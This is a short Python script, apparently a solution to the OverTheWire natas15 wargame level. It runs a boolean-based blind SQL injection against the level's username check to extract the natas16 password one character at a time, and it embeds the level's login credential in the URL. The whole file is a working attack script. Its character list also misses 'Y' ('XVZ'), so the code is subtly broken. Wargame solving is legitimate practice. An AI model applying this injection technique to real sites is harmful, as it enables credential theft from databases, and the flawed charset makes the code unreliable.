import requests

url='http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'
passchar='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXVZ1234567890'
bstr='This user exist'.encode('utf-8')
password=''

for i in range(32):
	for j in passchar:
		req = requests.get(url+'?username=natas16" AND password LIKE BINARY"' 
		+ password + j + '%" "')
		if req.content.find(bstr) != -1:
			password += j
			print('Password: ' + password)
			break